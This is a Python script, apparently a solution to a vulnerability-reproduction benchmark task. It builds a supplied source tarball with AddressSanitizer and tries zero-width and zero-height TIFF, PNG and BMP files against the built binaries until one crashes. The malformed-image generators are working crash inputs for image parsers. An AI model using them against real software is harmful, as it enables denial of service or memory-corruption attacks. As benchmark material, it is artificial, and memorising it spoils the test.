import os
import shutil
import subprocess
import tarfile
import struct
import zlib
import glob
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Create a workspace
        base_dir = os.getcwd()
        work_dir = os.path.join(base_dir, "work_env")
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
        os.makedirs(work_dir)

        # Extract the source code
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(work_dir)
        except Exception:
            # If extraction fails, we can't build, so we return a best-guess payload
            pass

        # Locate source root
        src_root = work_dir
        entries = os.listdir(work_dir)
        if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
            src_root = os.path.join(work_dir, entries[0])

        # Configure Environment for ASAN
        env = os.environ.copy()
        env['CC'] = 'clang'
        env['CXX'] = 'clang++'
        # Optimize level O1 to produce decent stack traces quickly, -g for debug info
        env['CFLAGS'] = '-fsanitize=address -g -O1'
        env['CXXFLAGS'] = '-fsanitize=address -g -O1'
        env['LDFLAGS'] = '-fsanitize=address'

        # Attempt to build
        built_binaries = []

        # Strategy 1: CMake
        if os.path.exists(os.path.join(src_root, "CMakeLists.txt")):
            build_dir = os.path.join(src_root, "build_cmake")
            os.makedirs(build_dir, exist_ok=True)
            try:
                subprocess.run(["cmake", ".."], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                for root, dirs, files in os.walk(build_dir):
                    for f in files:
                        fp = os.path.join(root, f)
                        # Identify executables
                        if os.access(fp, os.X_OK) and not f.endswith(('.so', '.a', '.o', '.txt', '.cmake')):
                            built_binaries.append(fp)
            except:
                pass

        # Strategy 2: Configure
        if not built_binaries and os.path.exists(os.path.join(src_root, "configure")):
            try:
                subprocess.run(["./configure", "--disable-shared"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        fp = os.path.join(root, f)
                        if os.access(fp, os.X_OK) and not f.endswith(('.so', '.a', '.o', '.c', '.h', '.in')):
                            built_binaries.append(fp)
            except:
                pass
        
        # Strategy 3: Makefile
        if not built_binaries and os.path.exists(os.path.join(src_root, "Makefile")):
            try:
                subprocess.run(["make", "-j8"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                for root, dirs, files in os.walk(src_root):
                    for f in files:
                        fp = os.path.join(root, f)
                        if os.access(fp, os.X_OK) and not f.endswith(('.so', '.a', '.o', '.c', '.h')):
                             built_binaries.append(fp)
            except:
                pass

        # Generators for zero width/height images
        def make_tiff(w, h):
            # Little Endian TIFF Header
            d = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
            # IFD entries
            entries = []
            entries.append(struct.pack('<HHII', 256, 3, 1, w)) # ImageWidth
            entries.append(struct.pack('<HHII', 257, 3, 1, h)) # ImageLength
            entries.append(struct.pack('<HHII', 258, 3, 1, 8)) # BitsPerSample
            entries.append(struct.pack('<HHII', 259, 3, 1, 1)) # Compression (None)
            entries.append(struct.pack('<HHII', 262, 3, 1, 2)) # PhotometricInterpretation (RGB)
            entries.append(struct.pack('<HHII', 273, 4, 1, 100)) # StripOffsets (dummy)
            entries.append(struct.pack('<HHII', 277, 3, 1, 3)) # SamplesPerPixel
            entries.append(struct.pack('<HHII', 278, 3, 1, 1)) # RowsPerStrip
            entries.append(struct.pack('<HHII', 279, 4, 1, 10)) # StripByteCounts (dummy)
            
            d += struct.pack('<H', len(entries))
            for e in entries: d += e
            d += b'\x00\x00\x00\x00' # Next IFD Offset
            return bytes(d)

        def make_png(w, h):
            sig = b'\x89PNG\r\n\x1a\n'
            def chk(t, d):
                return struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t+d)&0xffffffff)
            # IHDR: Width, Height, BitDepth(8), ColorType(2=RGB), Compression(0), Filter(0), Interlace(0)
            ihdr = struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)
            return sig + chk(b'IHDR', ihdr) + chk(b'IEND', b'')
            
        def make_bmp(w, h):
            # Bitmap File Header (14) + Bitmap Info Header (40)
            b = bytearray(b'BM' + b'\x00'*52)
            struct.pack_into('<I', b, 2, 54) # FileSize
            struct.pack_into('<I', b, 10, 54) # Offset
            struct.pack_into('<I', b, 14, 40) # InfoHeaderSize
            struct.pack_into('<I', b, 18, w) # Width
            struct.pack_into('<I', b, 22, h) # Height
            struct.pack_into('<H', b, 26, 1) # Planes
            struct.pack_into('<H', b, 28, 24) # BitCount
            return bytes(b)

        payloads = [
            ('bad_w.tif', make_tiff(0, 10)),
            ('bad_h.tif', make_tiff(10, 0)),
            ('bad_w.png', make_png(0, 10)),
            ('bad_h.png', make_png(10, 0)),
            ('bad_w.bmp', make_bmp(0, 10)),
            ('bad_h.bmp', make_bmp(10, 0))
        ]

        # Prioritize binaries: fuzzers, tests, and standard utilities (like tiffinfo)
        candidates = []
        for b in built_binaries:
            bn = os.path.basename(b).lower()
            if any(x in bn for x in ['fuzz', 'test', 'info', 'read', 'dump', 'convert']):
                candidates.insert(0, b)
            else:
                candidates.append(b)

        # Execution Loop
        for exe in candidates:
            for name, content in payloads:
                pp = os.path.join(work_dir, name)
                with open(pp, 'wb') as f:
                    f.write(content)
                
                try:
                    # Run executable with the payload
                    # Capture stderr for ASAN report
                    r = subprocess.run([exe, pp], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=2)
                    
                    # If process failed, check for ASAN error
                    if r.returncode != 0:
                        err = r.stderr.decode('latin1')
                        if "AddressSanitizer" in err:
                            # Confirmed vulnerability
                            shutil.rmtree(work_dir)
                            return content
                except Exception:
                    continue
        
        # Cleanup
        shutil.rmtree(work_dir)
        
        # Fallback: Return a TIFF with 0 width as it is the most likely candidate given the description
        return payloads[0][1]